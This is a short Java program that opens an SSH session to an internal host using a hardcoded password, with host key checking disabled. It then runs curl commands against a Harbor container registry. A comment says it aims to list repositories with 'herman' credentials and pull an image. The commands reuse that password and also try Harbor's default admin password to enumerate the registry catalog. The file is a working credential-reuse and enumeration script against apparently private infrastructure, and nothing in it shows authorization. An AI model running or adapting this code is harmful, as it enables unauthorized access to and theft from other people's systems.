import com.jcraft.jsch.*;
import java.io.*;
class DKI {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    // Try to list repos on Harbor with herman creds and pull NEO image
    ch.setCommand("echo ---HARBOR-REPOS---;curl -sk -u herman:kutul0nc4t 'https://artifacts.internaltools.biz/api/v2.0/repositories?page_size=100' 2>/dev/null | python3 -c 'import sys,json;[print(r[\"name\"]) for r in json.load(sys.stdin)]' 2>&1;echo ---V2-CATALOG---;curl -sk 'https://artifacts.internaltools.biz/v2/_catalog' 2>/dev/null;echo ---V2-CATALOG-AUTH---;curl -sk -u herman:kutul0nc4t 'https://artifacts.internaltools.biz/v2/_catalog' 2>/dev/null;echo ---V2-SEARCH---;curl -sk -u admin:Harbor12345 'https://artifacts.internaltools.biz/v2/_catalog' 2>/dev/null");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
